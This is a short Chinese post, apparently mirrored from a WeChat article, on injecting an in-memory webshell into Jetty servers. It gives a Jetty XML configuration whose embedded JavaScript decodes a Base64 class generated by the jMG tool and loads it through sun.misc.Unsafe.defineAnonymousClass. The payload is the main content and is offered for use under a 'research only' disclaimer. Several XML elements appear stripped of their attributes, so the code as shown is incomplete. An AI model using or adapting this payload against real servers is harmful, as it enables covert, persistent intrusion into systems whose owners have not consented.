<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/RW4rFOB2-HBdzBG4QewdfQ)

网上目前文章都是使用 BCELClassLoader，java8 某个小版本后就使用不了了，可以替换为 ScriptEngineManager 配合 jMG 生成 Base64 进行内存马注入。

```
<?xml version="1.0"?>
<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "http://www.eclipse.org/jetty/configure_9_3.dtd">
<Configure>
  <New></New>
  <Ref refid="scriptEngineManager">
    <Call >
      <Arg>js</Arg>
    </Call>
  </Ref>
  <Ref refid="getEngineByName">
    <Call >
      <Arg>
  var str="jMG-Base64";
  var bt;
  try {
   bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);
  } catch (e) {
   bt = java.util.Base64.getDecoder().decode(str);
  }
  var theUnsafe = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
  theUnsafe.setAccessible(true);unsafe = theUnsafe.get(null);
  unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), bt, null).newInstance();
      </Arg>
    </Call>
  </Ref>
</Configure>

```

参考文章: https://mp.weixin.qq.com/s/hrG6Hz-rKH2sR79M48qaRw

(该文章仅用于技术研究，请勿用于非法用途。对于产生的任何风险及违法问题不承担任何责任）